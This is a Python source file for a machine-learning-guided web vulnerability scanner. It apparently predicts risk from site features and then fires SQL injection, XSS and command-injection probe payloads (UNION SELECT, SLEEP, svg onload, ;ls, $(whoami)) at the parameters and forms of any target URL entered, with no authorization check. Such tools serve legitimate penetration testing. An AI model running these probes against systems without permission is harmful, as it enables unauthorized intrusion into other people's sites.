import re, os, time, subprocess, traceback, warnings,sys
import numpy as np, pandas as pd, joblib, httpx, urllib.parse, requests
from sklearn.ensemble import RandomForestClassifier
from sklearn.multiclass import OneVsRestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
from sklearn.preprocessing import StandardScaler
import URL_checkIfhaveVun, url_connection, mchine


msg = r"""
      ___           _              _   _               _   _                     
     / _ \         | |            | | | |             | | (_)                    
    / /_\ \  _   _ | |_  ___      | |_| | _   _  _ __ | |_  _  _ __    __ _      
   / / _ \ \| | | || __|/ _ \     |  _  || | | || '_ \| __|| || '_ \  / _` |     
  / / ___ \ \ |_| || |_| (_) |    | | | || |_| || | | || |_ | || | | || (_| |     
 /_/ /   \_\ \__,_| \__|\___/     \_| |_/ \__,_||_| |_| \__||_||_| |_| \__, |     
                                                                        __/ |     
                                                                       |___/
"""

def typewriter(msg):
    for chart in msg:
        sys.stdout.write(chart)
        sys.stdout.flush()

warnings.filterwarnings('ignore')

# ── Constants ──────────────────────────────────────────────────────────────
RECON_FILE = "web_recon_ml_dataset.csv"
VULN_FILE  = "vulnerability_ml_dataset.csv"
MODEL_FILE = "vulnerability_model.pkl"

# Features used for training (numeric cols available in recon dataset)
FEATURE_COLS = [
    'url_length', 'has_https', 'path_depth', 'has_query_params', 'num_query_params',
    'has_fragment', 'has_port', 'subdomain_count', 'is_ip_address', 'domain_length',
    'domain_has_hyphens', 'status_code', 'status_category', 'response_size',
    'response_time_ms', 'is_redirect', 'total_headers', 'server_header_present',
    'x_powered_by_present', 'has_cookies', 'num_cookies', 'has_cors', 'cache_control',
    'security_headers_count', 'has_csp', 'has_hsts', 'has_xss_protection',
    'has_frame_options', 'has_content_type_options',
    'has_forms', 'form_count', 'has_inputs', 'input_count',
    'has_buttons', 'button_count', 'has_textarea', 'textarea_count',
    'has_select', 'select_count', 'has_links', 'link_count',
    'has_images', 'image_count', 'has_scripts', 'script_count',
    'has_stylesheets', 'stylesheet_count', 'has_javascript',
    'has_comments', 'comment_count', 'has_meta_tags', 'meta_count', 'has_title',
    'server_apache', 'server_nginx', 'server_iis',
    'tech_php', 'tech_aspnet', 'tech_jsp', 'tech_wordpress', 'tech_drupal', 'tech_joomla',
    'has_debug_info', 'has_error_messages', 'has_sql_errors', 'has_file_paths',
    'cookie_count', 'session_cookies', 'redirect_count', 'has_redirect_chain', 'final_https',
    'input_to_form_ratio', 'script_to_content_ratio', 'security_score', 'interactivity_score',
]

LABEL_COLS = ['has_sql_injection', 'has_xss', 'has_command_injection']

VULN_NAMES = {0: 'sql_injection', 1: 'xss', 2: 'command_injection'}


# ═══════════════════════════════════════════════════════════════════════════
class VulnerabilityCheckerTraining:
# ═══════════════════════════════════════════════════════════════════════════

    def __init__(self, url=""):
        self.url   = url
        self.model = None
        self.scaler = StandardScaler()
        self.trained_feature_columns = []

    # ── Data loading & merging ─────────────────────────────────────────────
    def load_data(self, recon_path, vuln_path):
        try:
            r = pd.read_csv(recon_path)
            v = pd.read_csv(vuln_path)
            print(f"[+] Loaded recon: {len(r)} rows × {len(r.columns)} cols")
            print(f"[+] Loaded vuln : {len(v)} rows × {len(v.columns)} cols")
            return r, v
        except Exception as e:
            print(f"[-] Load error: {e}"); return None, None

    def _merge_datasets(self, recon, vuln):
        """Merge recon features with vuln labels by matching URL domains."""
        # Normalize URLs for matching
        def _domain(url):
            try:    return urllib.parse.urlparse(str(url)).netloc.lower().replace('www.', '')
            except: return str(url).lower()

        recon = recon.copy(); vuln = vuln.copy()
        recon['_domain'] = recon['target_url'].apply(_domain)
        vuln['_domain']  = vuln['url'].apply(_domain)

        # Keep only the latest recon per domain
        if 'timestamp' in recon.columns:
            recon = recon.sort_values('timestamp', ascending=False).drop_duplicates('_domain', keep='first')
        else:
            recon = recon.drop_duplicates('_domain', keep='first')

        # Keep only the latest vuln per domain
        if 'timestamp' in vuln.columns:
            vuln = vuln.sort_values('timestamp', ascending=False).drop_duplicates('_domain', keep='first')

        # Merge on domain
        merged = recon.merge(vuln[['_domain'] + [c for c in LABEL_COLS if c in vuln.columns]],
                             on='_domain', how='inner')
        print(f"[+] Merged dataset: {len(merged)} rows (matched by domain)")

        # Also include unmatched recon rows with labels = 0 (unknown)
        unmatched = recon[~recon['_domain'].isin(merged['_domain'])].copy()
        for c in LABEL_COLS:
            if c not in unmatched.columns: unmatched[c] = 0
        combined = pd.concat([merged, unmatched], ignore_index=True)
        print(f"[+] Combined dataset: {len(combined)} rows ({len(merged)} matched + {len(unmatched)} unlabeled)")
        return combined

    def _generate_augmented_data(self, n=150):
        """Generate domain-knowledge synthetic samples for augmentation."""
        np.random.seed(42)
        rows = []
        for _ in range(n):
            profile = np.random.choice(['vuln_sqli', 'vuln_xss', 'vuln_cmdi', 'secure', 'normal'])
            r = {c: 0 for c in FEATURE_COLS}
            # Base features
            r['url_length']       = np.random.randint(15, 120)
            r['domain_length']    = np.random.randint(5, 40)
            r['status_code']      = np.random.choice([200, 301, 403, 404, 500], p=[.6,.1,.1,.1,.1])
            r['status_category']  = r['status_code'] // 100
            r['response_size']    = np.random.randint(500, 80000)
            r['total_headers']    = np.random.randint(5, 25)
            r['has_scripts']      = np.random.choice([0,1], p=[.3,.7])
            r['script_count']     = np.random.randint(0, 20)
            r['has_links']        = 1; r['link_count'] = np.random.randint(1, 50)
            r['has_meta_tags']    = 1; r['meta_count'] = np.random.randint(1, 10)

            if profile == 'vuln_sqli':
                r['has_forms'] = 1; r['form_count'] = np.random.randint(1, 5)
                r['has_inputs'] = 1; r['input_count'] = np.random.randint(3, 15)
                r['has_query_params'] = 1; r['num_query_params'] = np.random.randint(1, 6)
                r['has_sql_errors'] = np.random.choice([0,1], p=[.4,.6])
                r['has_error_messages'] = np.random.choice([0,1], p=[.3,.7])
                r['security_headers_count'] = np.random.randint(0, 3)
                r['has_https'] = np.random.choice([0,1], p=[.5,.5])
                r['tech_php'] = np.random.choice([0,1], p=[.3,.7])
                for lbl in LABEL_COLS: r[lbl] = 0
                r['has_sql_injection'] = 1

            elif profile == 'vuln_xss':
                r['has_forms'] = 1; r['form_count'] = np.random.randint(1, 4)
                r['has_inputs'] = 1; r['input_count'] = np.random.randint(2, 10)
                r['has_scripts'] = 1; r['script_count'] = np.random.randint(5, 25)
                r['has_javascript'] = 1
                r['has_query_params'] = np.random.choice([0,1], p=[.3,.7])
                r['security_headers_count'] = np.random.randint(0, 4)
                r['has_xss_protection'] = 0
                r['has_csp'] = 0
                for lbl in LABEL_COLS: r[lbl] = 0
                r['has_xss'] = 1

            elif profile == 'vuln_cmdi':
                r['has_query_params'] = 1; r['num_query_params'] = np.random.randint(1, 4)
                r['has_forms'] = np.random.choice([0,1])
                r['has_inputs'] = 1; r['input_count'] = np.random.randint(1, 5)
                r['has_debug_info'] = np.random.choice([0,1], p=[.4,.6])
                r['has_error_messages'] = np.random.choice([0,1], p=[.3,.7])
                r['has_file_paths'] = np.random.choice([0,1], p=[.4,.6])
                r['security_headers_count'] = np.random.randint(0, 2)
                for lbl in LABEL_COLS: r[lbl] = 0
                r['has_command_injection'] = 1

            elif profile == 'secure':
                r['has_https'] = 1; r['final_https'] = 1
                r['security_headers_count'] = np.random.randint(5, 8)
                r['has_csp'] = 1; r['has_hsts'] = 1; r['has_xss_protection'] = 1
                r['has_frame_options'] = 1; r['has_content_type_options'] = 1
                r['security_score'] = np.random.uniform(0.7, 1.0)
                for lbl in LABEL_COLS: r[lbl] = 0

            else:  # normal
                r['has_forms'] = np.random.choice([0,1])
                r['has_inputs'] = r['has_forms']
                r['input_count'] = np.random.randint(0, 5) if r['has_forms'] else 0
                r['has_query_params'] = np.random.choice([0,1])
                r['security_headers_count'] = np.random.randint(2, 6)
                r['has_https'] = np.random.choice([0,1], p=[.3,.7])
                for lbl in LABEL_COLS: r[lbl] = 0

            r['input_to_form_ratio']      = r['input_count'] / max(r['form_count'], 1)
            r['script_to_content_ratio']   = r['script_count'] / max(r['response_size'], 1)
            r['security_score']            = r.get('security_score', r['security_headers_count'] / 8)
            r['interactivity_score']       = (r.get('form_count',0) + r['input_count'] + r.get('button_count',0)) / max(r['response_size']/1000, 1)
            rows.append(r)

        return pd.DataFrame(rows)

    # ── Training ───────────────────────────────────────────────────────────
    def train_model(self, recon_path=RECON_FILE, vuln_path=VULN_FILE):
        print("[*] Training vulnerability prediction model...")
        have_recon = os.path.exists(recon_path) and os.path.getsize(recon_path) > 0
        have_vuln  = os.path.exists(vuln_path)  and os.path.getsize(vuln_path) > 0

        frames = []

        # 1) Merge real data if available
        if have_recon and have_vuln:
            recon, vuln = self.load_data(recon_path, vuln_path)
            if recon is not None and vuln is not None:
                deduplicate_recon_dataset(recon_path)
                deduplicate_vulnerability_dataset(vuln_path)
                merged = self._merge_datasets(recon, vuln)
                frames.append(merged)
                print(f"[+] Real data: {len(merged)} samples")
        elif have_recon:
            recon = pd.read_csv(recon_path)
            for c in LABEL_COLS:
                if c not in recon.columns: recon[c] = 0
            frames.append(recon)
            print(f"[+] Recon-only data: {len(recon)} samples (no vuln labels)")

        # 2) Augment with synthetic data (less if we have lots of real data)
        real_count = sum(len(f) for f in frames)
        aug_count  = max(100, 200 - real_count * 3)  # Less augmentation with more real data
        aug = self._generate_augmented_data(aug_count)
        frames.append(aug)
        print(f"[+] Augmented: {aug_count} synthetic samples (real:{real_count})")

        # 3) Combine
        combined = pd.concat(frames, ignore_index=True)

        # Ensure all feature and label columns exist
        for c in FEATURE_COLS + LABEL_COLS:
            if c not in combined.columns: combined[c] = 0

        X = combined[FEATURE_COLS].apply(pd.to_numeric, errors='coerce').fillna(0)
        Y = combined[LABEL_COLS].apply(pd.to_numeric, errors='coerce').fillna(0).astype(int)

        self.trained_feature_columns = FEATURE_COLS
        print(f"[+] Training set: {len(X)} samples × {len(FEATURE_COLS)} features → {len(LABEL_COLS)} labels")

        # Distribution
        for i, col in enumerate(LABEL_COLS):
            pos = Y[col].sum()
            print(f"    {col}: {pos} positive ({pos/len(Y):.1%})")

        # 4) Scale & fit
        X_scaled = self.scaler.fit_transform(X)
        self.model = OneVsRestClassifier(
            RandomForestClassifier(n_estimators=150, max_depth=12, random_state=42,
                                   class_weight='balanced', min_samples_leaf=2)
        )
        self.model.fit(X_scaled, Y)

        # 5) Evaluate
        Y_pred = self.model.predict(X_scaled)
        print(f"\n[+] Training Accuracy (per-label):")
        for i, col in enumerate(LABEL_COLS):
            acc = accuracy_score(Y.iloc[:, i], Y_pred[:, i])
            print(f"    {col}: {acc:.2%}")

        # Feature importance (skip constant predictors for all-zero labels)
        fi = [est.feature_importances_ for est in self.model.estimators_
              if hasattr(est, 'feature_importances_')]
        if fi:
            importances = np.mean(fi, axis=0)
            top_idx = np.argsort(importances)[-10:][::-1]
            print(f"\n[+] Top 10 Important Features:")
            for idx in top_idx:
                print(f"    {FEATURE_COLS[idx]}: {importances[idx]:.4f}")
        else:
            print("\n[!] No feature importances (all labels constant)")

        return True

    # ── Prediction ─────────────────────────────────────────────────────────
    def predict_vulnerability(self, features_dict):
        """Predict vulnerability probabilities from recon features."""
        if not self.model:
            print("[-] Model not trained"); return None
        try:
            X = pd.DataFrame([features_dict])
            for c in self.trained_feature_columns:
                if c not in X.columns: X[c] = 0
            X = X[self.trained_feature_columns].apply(pd.to_numeric, errors='coerce').fillna(0)
            X_scaled = self.scaler.transform(X)

            proba = self.model.predict_proba(X_scaled)
            
            result = {'predictions': {}, 'top_risk': 'none', 'top_confidence': 0.0}
            for i, col in enumerate(LABEL_COLS):
                if isinstance(proba, list):
                    p = proba[i][0]
                else:             
                    p = proba[0][i]

                if np.ndim(p) == 0:
                    conf = float(p)
                else:
                    conf = p[1] if len(p) > 1 else p[0]
                name = col.replace('has_', '')
                result['predictions'][name] = round(float(conf), 3)
                if conf > result['top_confidence']:
                    result['top_confidence'] = float(conf)
                    result['top_risk'] = name

            # Print summary
            print(f"\n{'='*55}")
            print(f"  ML VULNERABILITY PREDICTIONS")
            print(f"{'='*55}")
            sorted_preds = sorted(result['predictions'].items(), key=lambda x: x[1], reverse=True)
            for name, prob in sorted_preds:
                bar = '█' * int(prob * 20) + '░' * (20 - int(prob * 20))
                lvl = '🔴 HIGH' if prob > 0.6 else '🟡 MED' if prob > 0.3 else '🟢 LOW'
                print(f"  {name:25s} {bar} {prob:.1%}  {lvl}")
            print(f"{'='*55}")
            print(f"  Top risk: {result['top_risk']} ({result['top_confidence']:.1%})")
            print(f"{'='*55}\n")
            return result
        except Exception as e:
            print(f"[-] Prediction error: {e}"); traceback.print_exc(); return None

    # ── Save / Load ────────────────────────────────────────────────────────
    def save_model(self, path=MODEL_FILE):
        if not self.model: print("[-] No model to save"); return
        joblib.dump({'model': self.model, 'scaler': self.scaler,
                     'feature_columns': self.trained_feature_columns,
                     'label_columns': LABEL_COLS}, path)
        print(f"[+] Model saved → {path}")

    def load_model(self, path=MODEL_FILE):
        try:
            d = joblib.load(path)
            self.model  = d['model']
            self.scaler = d['scaler']
            self.trained_feature_columns = d['feature_columns']
            print(f"[+] Model loaded ← {path} ({len(self.trained_feature_columns)} features)")
            return True
        except Exception as e:
            print(f"[-] Load error: {e}"); return False


# ═══════════════════════════════════════════════════════════════════════════
class SmartVulnerabilityScanner(VulnerabilityCheckerTraining):
# ═══════════════════════════════════════════════════════════════════════════

    def __init__(self, url):
        super().__init__(url)
        self.prediction = None

    def extract_recon_features(self):
        """Extract real recon features by fetching the URL live."""
        print(f"[*] Extracting live recon features: {self.url}")
        try:
            recon = url_connection.ReconWebSite(self.url)
            with httpx.Client(timeout=10.0, verify=False, follow_redirects=True) as c:
                resp = c.get(self.url, headers=url_connection.UA)
            features = recon.extract_recon_features(resp, self.url)
            # Keep only numeric feature columns
            out = {}
            for col in FEATURE_COLS:
                val = features.get(col, 0)
                try:    out[col] = float(val)
                except: out[col] = 0.0
            print(f"[+] Extracted {len(out)} live features (status:{features.get('status_code')} "
                  f"size:{features.get('response_size',0)} forms:{features.get('form_count',0)} "
                  f"inputs:{features.get('input_count',0)} scripts:{features.get('script_count',0)})")
            return out
        except Exception as e:
            print(f"[-] Live extraction failed: {e}, using URL-only features")
            return self._url_only_features()

    def _url_only_features(self):
        """Fallback: extract features from URL structure only."""
        p = urllib.parse.urlparse(self.url)
        f = {c: 0 for c in FEATURE_COLS}
        f.update({
            'url_length':       len(self.url),
            'has_https':        int(self.url.startswith('https')),
            'path_depth':       len([x for x in p.path.split('/') if x]),
            'has_query_params': int(bool(p.query)),
            'num_query_params': len(urllib.parse.parse_qs(p.query)),
            'subdomain_count':  max(0, len(p.netloc.split('.')) - 2),
            'domain_length':    len(p.netloc),
            'domain_has_hyphens': int('-' in p.netloc),
            'is_ip_address':    int(bool(re.match(r'\d+\.\d+\.\d+\.\d+', p.netloc))),
        })
        return f

    def smart_vulnerability_scan(self, model_path=MODEL_FILE):
        """ML-guided vulnerability scanning."""
        print(f"\n{'='*60}")
        print(f"  SMART VULNERABILITY SCAN")
        print(f"  Target: {self.url}")
        print(f"{'='*60}")

        # Load model
        if model_path and not self.model:
            if not self.load_model(model_path):
                print("[-] No model, training fresh...")
                self.train_model()
                self.save_model(model_path)

        # Extract features & predict
        features = self.extract_recon_features()
        self.prediction = self.predict_vulnerability(features) if self.model else None

        # Run targeted tests based on prediction
        vulns = []
        if self.prediction:
            preds = self.prediction['predictions']
            # Only run tests for vuln types with >15% probability
            if preds.get('sql_injection', 0) > 0.15:
                print("[*] ML suggests SQLi risk → testing...")
                vulns.extend(self._test_sql_injection())
            if preds.get('xss', 0) > 0.15:
                print("[*] ML suggests XSS risk → testing...")
                vulns.extend(self._test_xss())
            if preds.get('command_injection', 0) > 0.15:
                print("[*] ML suggests CmdInj risk → testing...")
                vulns.extend(self._test_command_injection())
            if not vulns and all(v < 0.15 for v in preds.values()):
                print("[*] Low risk predicted, running basic checks anyway...")
                vulns.extend(self._test_sql_injection())
                vulns.extend(self._test_xss())
        else:
            print("[*] No ML prediction, running all basic tests...")
            vulns.extend(self._test_sql_injection())
            vulns.extend(self._test_xss())
            vulns.extend(self._test_command_injection())

        return vulns

    # ── Quick vulnerability tests ──────────────────────────────────────────
    def _test_sql_injection(self):
        vulns = []
        p = urllib.parse.urlparse(self.url)
        params_to_test = {}
        forms_to_test = []

        # Collect params from URL query string
        if p.query:
            params_to_test = urllib.parse.parse_qs(p.query)

        # Crawl page for forms (works even without query params)
        try:
            from bs4 import BeautifulSoup
            r = requests.get(self.url, timeout=8, verify=False,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            soup = BeautifulSoup(r.text, 'html.parser')
            for form in soup.find_all('form'):
                act = form.get('action', '')
                method = form.get('method', 'get').lower()
                act_url = urllib.parse.urljoin(self.url, act) if act else self.url
                form_params = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select'])
                               if inp.get('name') and inp.get('type', '').lower() not in ('submit', 'button', 'reset', 'image')]
                if form_params:
                    forms_to_test.append({'url': act_url, 'method': method, 'params': form_params})
        except Exception:
            pass

        # If we still have nothing, use common param names
        if not params_to_test and not forms_to_test:
            params_to_test = {p: ['test'] for p in ['id', 'search', 'q', 'page']}

        # SQL error patterns
        sql_errors = [
            'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
            'odbc', 'unterminated', 'unclosed quotation', 'syntax error',
            'ora-', 'pg_query', 'mysql_fetch', 'division by zero',
            'unknown column', 'no such table', 'column.*not found',
            'mssql', 'warning.*mysql', 'warning.*pg_',
        ]
        payloads = [
            ("'", "error-based"), ("\"", "error-based"),
            ("' OR '1'='1", "boolean-based"), ("1 OR 1=1", "boolean-based"),
            ("' UNION SELECT NULL--", "union-based"),
            ("' UNION SELECT NULL,NULL--", "union-based"),
            ("1' ORDER BY 10--", "order-by probe"),
        ]
        time_payloads = [
            ("1' AND SLEEP(3)-- ", "time-based MySQL"),
            ("1; WAITFOR DELAY '0:0:3'-- ", "time-based MSSQL"),
        ]

        # Get baseline
        try:
            base_r = requests.get(self.url, timeout=5, verify=False)
            base_time = base_r.elapsed.total_seconds()
            base_len = len(base_r.text)
        except:
            base_time, base_len = 1.0, 0

        import concurrent.futures

        def _worker_sqli(task):
            kind, param, payload, ptype, form = task
            test_url = self._inject(self.url, param, payload) if kind == 'url' else form['url']
            try:
                if kind == 'url':
                    r = requests.get(test_url, timeout=5, verify=False)
                elif form['method'] == 'post':
                    r = requests.post(test_url, data={param: payload}, timeout=5, verify=False)
                else:
                    r = requests.get(test_url, params={param: payload}, timeout=5, verify=False)
                    
                if any(re.search(e, r.text, re.I) for e in sql_errors):
                    res = {'type': f'SQL Injection ({ptype})', 'parameter': param, 'payload': payload, 'confidence': 'high', 'tool': 'quick_scan'}
                    if kind == 'form': res['method'] = form['method']
                    tag = f" [{form['method'].upper()}]" if kind == 'form' else ""
                    print(f"    [!] SQLi: {param} ({ptype}){tag}")
                    return res
            except: pass
            return None

        def _time_worker_sqli(task):
            param, payload, ptype = task
            test_url = self._inject(self.url, param, payload)
            try:
                t0 = time.time()
                requests.get(test_url, timeout=10, verify=False)
                elapsed = time.time() - t0
                if elapsed > base_time + 2.5:
                    print(f"    [!] SQLi: {param} ({ptype}) delay={elapsed:.1f}s")
                    return {'type': f'SQL Injection ({ptype})', 'parameter': param, 'payload': payload, 'confidence': 'medium', 'tool': 'quick_scan'}
            except: pass
            return None

        tasks = []
        for param in list(params_to_test.keys())[:5]:
            for payload, ptype in payloads:
                tasks.append(('url', param, payload, ptype, None))
        for form in forms_to_test[:5]:
            for param in form['params'][:4]:
                for payload, ptype in payloads:
                    tasks.append(('form', param, payload, ptype, form))

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for res in executor.map(_worker_sqli, tasks):
                if res and res['parameter'] not in [v['parameter'] for v in vulns]:
                    vulns.append(res)
        
        found_params = {v['parameter'] for v in vulns}
        time_tasks = []
        for param in list(params_to_test.keys())[:5]:
            if param not in found_params:
                for payload, ptype in time_payloads:
                    time_tasks.append((param, payload, ptype))
                    
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for res in executor.map(_time_worker_sqli, time_tasks):
                if res and res['parameter'] not in [v['parameter'] for v in vulns]:
                    vulns.append(res)
        return vulns

    def _test_xss(self):
        vulns = []
        p = urllib.parse.urlparse(self.url)
        params_to_test = urllib.parse.parse_qs(p.query) if p.query else {}
        forms_to_test = []

        # Crawl forms
        try:
            from bs4 import BeautifulSoup
            r = requests.get(self.url, timeout=8, verify=False,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            soup = BeautifulSoup(r.text, 'html.parser')
            for form in soup.find_all('form'):
                act = form.get('action', '')
                method = form.get('method', 'get').lower()
                act_url = urllib.parse.urljoin(self.url, act) if act else self.url
                form_params = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select'])
                               if inp.get('name') and inp.get('type', '').lower() not in ('submit', 'button', 'reset', 'image')]
                if form_params:
                    forms_to_test.append({'url': act_url, 'method': method, 'params': form_params})
        except Exception:
            pass

        if not params_to_test and not forms_to_test:
            params_to_test = {p: ['test'] for p in ['search', 'q', 'query', 'name']}

        import random, string
        canary = 'xSsQk' + ''.join(random.choices(string.ascii_lowercase, k=4))
        payloads = [
            (f'<script>alert("{canary}")</script>', "script tag"),
            (f'"><img src=x onerror=alert("{canary}")>', "img onerror"),
            (f"'><svg onload=alert('{canary}')>", "svg onload"),
            (f'<details open ontoggle=alert("{canary}")>', "details ontoggle"),
            (canary, "reflection"),
        ]

        import concurrent.futures

        def _worker_xss(task):
            kind, param, payload, ptype, form = task
            test_url = self._inject(self.url, param, payload) if kind == 'url' else form['url']
            try:
                if kind == 'url':
                    r = requests.get(test_url, timeout=5, verify=False)
                elif form['method'] == 'post':
                    r = requests.post(test_url, data={param: payload}, timeout=5, verify=False)
                else:
                    r = requests.get(test_url, params={param: payload}, timeout=5, verify=False)
                    
                if canary in r.text:
                    conf = 'high' if payload in r.text and ptype != 'reflection' else 'medium'
                    res = {'type': f'XSS ({ptype})', 'parameter': param, 'payload': payload, 'confidence': conf, 'tool': 'quick_scan'}
                    if kind == 'form': res['method'] = form['method']
                    tag = f" [{form['method'].upper()}]" if kind == 'form' else f" conf:{conf}"
                    print(f"    [!] XSS: {param} ({ptype}){tag}")
                    return res
            except: pass
            return None

        tasks = []
        for param in list(params_to_test.keys())[:5]:
            for payload, ptype in payloads:
                tasks.append(('url', param, payload, ptype, None))
        for form in forms_to_test[:5]:
            for param in form['params'][:4]:
                for payload, ptype in payloads:
                    tasks.append(('form', param, payload, ptype, form))

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for res in executor.map(_worker_xss, tasks):
                if res and res['parameter'] not in [v['parameter'] for v in vulns]:
                    vulns.append(res)
        return vulns

    def _test_command_injection(self):
        vulns = []
        p = urllib.parse.urlparse(self.url)
        params_to_test = urllib.parse.parse_qs(p.query) if p.query else {}
        forms_to_test = []

        # Crawl forms
        try:
            from bs4 import BeautifulSoup
            r = requests.get(self.url, timeout=8, verify=False,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            soup = BeautifulSoup(r.text, 'html.parser')
            for form in soup.find_all('form'):
                act = form.get('action', '')
                method = form.get('method', 'get').lower()
                act_url = urllib.parse.urljoin(self.url, act) if act else self.url
                form_params = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select'])
                               if inp.get('name') and inp.get('type', '').lower() not in ('submit', 'button', 'reset', 'image')]
                if form_params:
                    forms_to_test.append({'url': act_url, 'method': method, 'params': form_params})
        except Exception:
            pass

        if not params_to_test and not forms_to_test:
            params_to_test = {p: ['test'] for p in ['cmd', 'exec', 'command', 'file']}

        response_indicators = ['uid=', 'root:', '/bin/', 'www-data', 'daemon:', 'nobody:']
        payloads = [";ls", "|id", "$(whoami)", "`id`", "|| id", "& id"]
        time_payloads = [(";sleep 3", "time-based"), ("| sleep 3", "time-based")]

        try:
            base_r = requests.get(self.url, timeout=5, verify=False)
            base_time = base_r.elapsed.total_seconds()
        except:
            base_time = 1.0

        import concurrent.futures

        def _worker_cmd(task):
            kind, param, payload, form = task
            test_url = self._inject(self.url, param, payload) if kind == 'url' else form['url']
            try:
                if kind == 'url':
                    r = requests.get(test_url, timeout=5, verify=False)
                elif form['method'] == 'post':
                    r = requests.post(test_url, data={param: payload}, timeout=5, verify=False)
                else:
                    r = requests.get(test_url, params={param: payload}, timeout=5, verify=False)
                    
                if any(ind in r.text.lower() for ind in response_indicators):
                    res = {'type': 'Command Injection', 'parameter': param, 'payload': payload, 'confidence': 'high', 'tool': 'quick_scan'}
                    if kind == 'form': res['method'] = form['method']
                    tag = f" [{form['method'].upper()}]" if kind == 'form' else f" ({payload})"
                    print(f"    [!] CmdInj: {param}{tag}")
                    return res
            except: pass
            return None

        def _time_worker_cmd(task):
            param, payload, ptype = task
            test_url = self._inject(self.url, param, payload)
            try:
                t0 = time.time()
                requests.get(test_url, timeout=10, verify=False)
                elapsed = time.time() - t0
                if elapsed > base_time + 2.5:
                    print(f"    [!] CmdInj: {param} delay={elapsed:.1f}s")
                    return {'type': f'Command Injection ({ptype})', 'parameter': param, 'payload': payload, 'confidence': 'medium', 'tool': 'quick_scan'}
            except: pass
            return None

        tasks = []
        for param in list(params_to_test.keys())[:4]:
            for payload in payloads:
                tasks.append(('url', param, payload, None))
        for form in forms_to_test[:4]:
            for param in form['params'][:3]:
                for payload in payloads:
                    tasks.append(('form', param, payload, form))

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for res in executor.map(_worker_cmd, tasks):
                if res and res['parameter'] not in [v['parameter'] for v in vulns]:
                    vulns.append(res)
                    
        found_params = {v['parameter'] for v in vulns}
        time_tasks = []
        for param in list(params_to_test.keys())[:4]:
            if param not in found_params:
                for payload, ptype in time_payloads:
                    time_tasks.append((param, payload, ptype))
                    
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for res in executor.map(_time_worker_cmd, time_tasks):
                if res and res['parameter'] not in [v['parameter'] for v in vulns]:
                    vulns.append(res)
        return vulns

    @staticmethod
    def _inject(url, param, payload):
        p = urllib.parse.urlparse(url)
        q = urllib.parse.parse_qs(p.query)
        q[param] = [payload]
        return urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params,
                                        urllib.parse.urlencode(q, doseq=True), p.fragment))


# ═══════════════════════════════════════════════════════════════════════════
# Dataset utilities
# ═══════════════════════════════════════════════════════════════════════════

def deduplicate_recon_dataset(path=RECON_FILE):
    try:
        df = pd.read_csv(path); orig = len(df)
        if 'timestamp' in df.columns:
            df = df.sort_values('timestamp', ascending=False)
        df = df.drop_duplicates(subset=['target_url'], keep='first')
        if 'response_size' in df.columns:
            df = df[df['response_size'] > 0]
        df.to_csv(path, index=False)
        print(f"[+] Recon dedup: {orig} → {len(df)} ({orig-len(df)} removed)")
    except Exception as e:
        print(f"[-] Dedup error: {e}")

def deduplicate_vulnerability_dataset(path=VULN_FILE):
    try:
        df = pd.read_csv(path); orig = len(df)
        if 'timestamp' in df.columns:
            df = df.sort_values('timestamp', ascending=False)
        df = df.drop_duplicates(subset=['url'], keep='first')
        df.to_csv(path, index=False)
        print(f"[+] Vuln dedup: {orig} → {len(df)} ({orig-len(df)} removed)")
    except Exception as e:
        print(f"[-] Dedup error: {e}")

def get_parameters(url):
    try:
        r = subprocess.run(['curl', '-s', '-L', url], capture_output=True, text=True, timeout=10)
        if r.returncode == 0:
            print(f"[+] Fetched: {url}")
            names = list(set(re.findall(r'<input[^>]*name\s*=\s*["\']([^"\']*)["\']', r.stdout, re.I)))
            if names: print(f"[+] Parameters: {', '.join(names)}")
        else:
            print(f"[-] Curl error: {r.stderr}")
    except subprocess.TimeoutExpired:
        print(f"[-] Timeout: {url}")
    except Exception as e:
        print(f"[-] Error: {e}")


# ═══════════════════════════════════════════════════════════════════════════
def main():
    # 1) Train / load model
    trainer = VulnerabilityCheckerTraining()
    if os.path.exists(MODEL_FILE):
        trainer.load_model(MODEL_FILE)
        print("[*] Retraining with latest data...")
    trainer.train_model()
    trainer.save_model()

    # 2) Get target
    Target = input("\nEnter URL or IP Target: ").strip()
    if not Target:
        print("[-] No target"); return

    # 3) URL target
    if Target.startswith(("http://", "https://")):
        get_parameters(Target)
        print(f"\n[*] Target URL: {Target}")

        # Run smart ML prediction first
        scanner = SmartVulnerabilityScanner(Target)
        scanner.load_model(MODEL_FILE)
        quick_vulns = scanner.smart_vulnerability_scan(MODEL_FILE)

        # Run full recon
        if url_connection.MainRecon(Target):
            print("\n[+] Recon complete, running full vulnerability scan...")
            URL_checkIfhaveVun.MainestVuln(Target)

        # Summary
        print(f"\n{'='*60}")
        print(f"  SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"  Quick scan vulnerabilities: {len(quick_vulns)}")
        for v in quick_vulns:
            print(f"    [{v['confidence'].upper()}] {v['type']} → param:{v['parameter']}")
        if scanner.prediction:
            print(f"\n  ML Risk Assessment:")
            for name, prob in sorted(scanner.prediction['predictions'].items(),
                                      key=lambda x: x[1], reverse=True):
                print(f"    {name:25s} {prob:.1%}")
        print(f"{'='*60}")

    # 4) IP target
    else:
        print(f"[*] Target IP: {Target}")
        mchine.MainPenTest(Target)



if __name__ == "__main__":
    typewriter(msg)
    main()